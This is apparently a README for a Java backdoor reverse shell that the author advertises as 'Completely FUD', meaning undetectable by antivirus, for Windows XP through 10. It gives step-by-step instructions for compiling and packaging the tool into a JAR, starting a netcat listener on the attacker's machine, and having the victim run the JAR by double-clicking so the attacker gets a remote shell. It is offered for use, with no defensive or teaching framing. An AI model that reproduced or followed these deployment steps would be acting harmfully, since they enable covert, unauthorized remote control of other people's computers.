This is a Java based Completely FUD backdoor reverse shell, for Windows XP,Vista,7,8.x,10 , coded entirely in java.

This project was developed using openjdk version "11.0.3".

To compile the file , simply run javac connectback.java.
This will create the .class file.
Create a manifest file, as per the JDK version on your device.
Filename : connectback.mf
Format:
Manifest-Version: 11.0.3
Main-Class: connectback

Now This can be packed into a .JAR executable file using :jar cmf connectback.mf connectback.jar connectback.class connectback.java

Start a netcat listner using nc -lvp 8080 ( I've used port 8080 as my listening port)

Port the .JAR file to the windows machine and execute it either by using java -jar connectback.jar or simply double clicking on the file , and you should instantly get your reverse shell on the attacker machine.

Cheers

#Captain_Nemo

https://www.youtube.com/watch?v=BaPRKLP9B_4
